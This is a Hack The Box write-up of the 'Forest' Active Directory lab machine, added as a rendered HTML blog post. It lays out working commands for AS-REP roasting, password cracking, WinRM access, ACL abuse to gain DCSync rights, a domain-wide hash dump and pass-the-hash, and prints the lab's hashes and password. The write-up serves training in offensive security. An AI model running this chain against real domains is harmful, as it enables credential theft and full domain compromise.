@@ -1,0 +1,183 @@
+I"�;<p><strong><center>Ref°: HTB-02-Machine</center></strong></p>
+
+<p>— Forest is a Windows machine that highlights the enumeration of users through the smb service and the practice of the AS-REP Roasting attack (Kerberos service) to find our first credential. This allows us to have access on the machine with evil-winrm tool and get flag user.</p>
+
+<p>A privilege escalation is possible when our user is in Exchange Windows permissions security group. The use of the BloodHound tool is essential to understand and identify this type of attack. Once the exploit is completed, we can attack with DCSync method to dump all the hash of the domain. And with wmiexec tool we can connect with hash of administrator and get flag root.</p>
+
+<p><img src="/assets/images/forest/HTB-Information-Forest.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="check-all-services">Check all services</h3>
+<hr />
+
+<p>We find interesting services ; <code class="language-plaintext highlighter-rouge">dns</code>, <code class="language-plaintext highlighter-rouge">kerberos</code>, <code class="language-plaintext highlighter-rouge">ldap</code> and <code class="language-plaintext highlighter-rouge">smb</code> on their usual ports.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.161 <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/forest/HTB-Images-Forest-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="smb">Smb</h3>
+<hr />
+
+<p>Only smb service give us essential informations with <code class="language-plaintext highlighter-rouge">smb_enumusers</code> module present on Metasploit.</p>
+
+<p>The scan show us all users present on our target : <code class="language-plaintext highlighter-rouge">Administrator, Guest, krbtgt, sebastien, lucinda, svc-alfresco, andy, mark, santi, meepo</code></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfconsole
+<span class="gp">msf5 &gt;</span><span class="w"> </span>use auxiliary/scanner/smb/smb_enumusers
+<span class="gp">msf5 &gt;</span><span class="w"> </span><span class="nb">set </span>rhosts 10.10.10.161
+<span class="gp">msf5 &gt;</span><span class="w"> </span>exploit
+</code></pre></div></div>
+
+<h3 id="vulnerabilities">Vulnerabilities</h3>
+<hr />
+
+<p>We have much possitiblity to exploit Active-Directory Machine.</p>
+
+<p>Reference - Active-Directory exploit toolbox : <a href="https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md">https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md</a></p>
+
+<p>Here our target is kerberos service. This service is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. We have several possible attacks : AS-Rep Roasting / Kerberoasting / Pass the key / Pass the ticket / Silver ticket / Golden ticket</p>
+
+<p>We use AS-Rep Roasting attack to gain a foothold. This technique is simple, that allows to retrieve hash (NTLM) from users of a domain that do not require kerberos pre-authentication. The hash can then be cracked via JohnTheRipper for example. By default pre-authentication is enabled but can be disabled in the user properties via the Active Directory.</p>
+
+<p>Reference - AS-Rep Roasting attack : <a href="https://beta.hackndo.com/kerberos-asrep-roasting/">https://beta.hackndo.com/kerberos-asrep-roasting/</a></p>
+
+<h2 id="2foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
+<h3 id="as-rep-roasting-attack">AS-Rep Roasting Attack</h3>
+<hr />
+
+<p>Creation of the userfile with all users found above.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nano /root/Documents/writeups/forest/userfile-asrep.txt
+</code></pre></div></div>
+
+<p>Get hash password of all users who do not require Kerberos preauthentication with GetNPUsers.py</p>
+
+<p>Reference - GetNPUsers.py : <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python GetNPUsers.py htb.local/ <span class="nt">-usersfile</span> /root/Documents/writeups/forest/userfile-asrep.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> /root/Documents/writeups/forest/hashuser.txt <span class="nt">-dc-ip</span> 10.10.10.161
+</code></pre></div></div>
+<p>We result hash NTLM of user the user svc-alfresco : <code class="language-plaintext highlighter-rouge">$krb5asrep$23$svc-alfresco@HTB.LOCAL:4512c77868fc6faa05403bc6f5537168$3e1c84151e6c0d9e4119321f03f1f944f8779562b1736898de960760e358f1163024e8263e36e0b695bdfca3ce60e3e340b66bba1951a4b7525176323d1ac7d8b6a37608e59ca4432401c9b9e822f7e3f4b5c27f596571e70b89bf47a145d46c2d77a49a75532ff361e093c9db20c602b280d592caf932178c4c69633bebf546bdac13b558ff4c4a3b2c525f3c6d93f5d69e0cb75b2e191d1ef007c332de24a9a3a608fb6d390f9ad414ccee66c2a9bfc7baef91f0cd747606fdc121c0c4e77065a5c10289e85e8b90b0251215decbf8bf4f02bfa383b44c974a5af7aedba2f4d71fc38527b6</code></p>
+
+<h3 id="cracking-password">Cracking Password</h3>
+<hr />
+
+<p>We crack the password of the user svc-alfresco : <code class="language-plaintext highlighter-rouge">s3rvice</code></p>
+
+<p>Reference - johntheripper tool : <a href="https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c">https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>/usr/sbin/john <span class="nt">--wordlist</span><span class="o">=</span>/root/Documents/wordlist/rockyou.txt /root/Documents/writeups/forest/hashuser.txt
+</code></pre></div></div>
+
+<p>We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).</p>
+
+<p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p>
+
+<p>Reference - evil-winrm tool : <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice
+</code></pre></div></div>
+
+<p>The exploitation is successful and we have gained a foothold.</p>
+
+<h2 id="3privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[3] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="auditing-with-bloodhound">Auditing with BloodHound</h3>
+<hr />
+
+<p>BloodHound is a tool for mapping an Active Directory environment by representing it as a graph.
+This representation then offers all the power of graph theory to discover paths of attack that would otherwise be difficult or impossible to detect.</p>
+
+<p>References - BloodHound :</p>
+<ul>
+  <li><a href="https://beta.hackndo.com/bloodhound/">https://beta.hackndo.com/bloodhound/</a></li>
+  <li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></li>
+  <li><a href="https://github.com/BloodHoundAD/BloodHound/wiki/getting-started">https://github.com/BloodHoundAD/BloodHound/wiki/getting-started</a></li>
+  <li><a href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a></li>
+</ul>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice <span class="nt">-s</span> <span class="s2">"/root/Documents/exploit-Win-RM/"</span>
+<span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span><span class="w"> </span>SharpHound.ps1
+<span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span><span class="w"> </span>menu
+<span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span><span class="w"> </span>Invoke-BloodHound <span class="nt">-CollectionMethod</span> All <span class="nt">-JSONFolder</span> <span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\s</span><span class="s2">vc-alfresco</span><span class="se">\D</span><span class="s2">ocuments"</span>
+</code></pre></div></div>
+
+<p>We download 2020xxxxxxxxxxxxxx_BloodHound.zip and export in bloodhound on our attacking machine to audit and see all possibility of escalation.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>neo4j console
+<span class="go">----
+</span><span class="gp">$</span><span class="w"> </span>bloodhound
+</code></pre></div></div>
+
+<p><img src="/assets/images/forest/HTB-Images-Forest-Bloodhound_Exchange.png" alt="Desktop View" /></p>
+
+<h3 id="exchange-windows---acls-abuse">Exchange Windows - ACLs abuse</h3>
+<hr />
+
+<p>A privilege escalation is possible from the Exchange Windows permissions security group to compromise an Active Directory domain.</p>
+
+<p>References - exploit :</p>
+<ul>
+  <li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync">https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync</a></li>
+  <li><a href="https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md">https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md</a></li>
+  <li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/">https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/</a></li>
+  <li><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></li>
+</ul>
+
+<p>Add new user in “Exchange Windows Permissions” security group.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span><span class="w"> </span>net user privateuser45 zrc45pctVSGcNp /add /domain
+<span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span>net localgroup <span class="s2">"Remote Management Users"</span> privateuser45 /add
+<span class="gp"> PS c:\Users\svc-alfresco\Documents&gt;</span><span class="w"> </span>net group <span class="s2">"Exchange Windows Permissions"</span> privateuser45 /add
+</code></pre></div></div>
+<p>“Remote Management Users” local group allow connection with evil winrm.</p>
+
+<p>Set the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All to increase rights on the domain object with PowerViews:</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> privateuser45 <span class="nt">-p</span> zrc45pctVSGcNp <span class="nt">-s</span> <span class="s2">"/root/Documents/exploit-Win-RM/Empire/data/module_source/situational_awareness/network/"</span>
+<span class="gp"> PS c:\Users\privateuser45\Documents&gt;</span><span class="w"> </span>powerview.ps1
+<span class="gp"> PS c:\Users\privateuser45\Documents&gt;</span><span class="w"> </span>menu
+<span class="gp"> PS c:\Users\privateuser45\Documents&gt;</span><span class="w"> </span>Add-DomainObjectAcl <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> privateuser45 <span class="nt">-Rights</span> DCSync
+</code></pre></div></div>
+<p>We have now sufficient rights to dump all domain credentials (Kerberos keys, hashes, etc.).</p>
+
+<h3 id="dcsync-attack">DCSync Attack</h3>
+<hr />
+
+<p>DCSync is an attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password hash of the entire domain via domain replication.</p>
+
+<p>References - DCSync Attack :</p>
+<ul>
+  <li><a href="https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633">https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633</a></li>
+  <li><a href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync">https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync</a></li>
+</ul>
+
+<p>Reference - secretdump.py : <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py</a></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python secretsdump.py <span class="nt">-just-dc</span> HTB.LOCAL/private45@10.10.10.161
+</code></pre></div></div>
+
+<p>We retrieve the html hash of administrator to success a connection with wmiexec : <code class="language-plaintext highlighter-rouge">Hash Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</code></p>
+
+<h3 id="pass-the-hash">Pass-The-Hash</h3>
+<hr />
+
+<p>Reference - Pass the Hash : https://blog.ropnop.com/practical-usage-of-ntlm-hashes/</p>
+
+<p>Reference - wmiexec.py : https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python wmiexec.py <span class="nt">-hashes</span> :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+</code></pre></div></div>
+
+<p>We have compromise Forest machine.</p>
+
+<hr />
+
+<h2 id="trophy"><strong><center>Trophy</center></strong></h2>
+
+<blockquote>
+  <p><strong>Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win.</strong></p>
+
+  <p>John Lambert</p>
+</blockquote>
+:ET
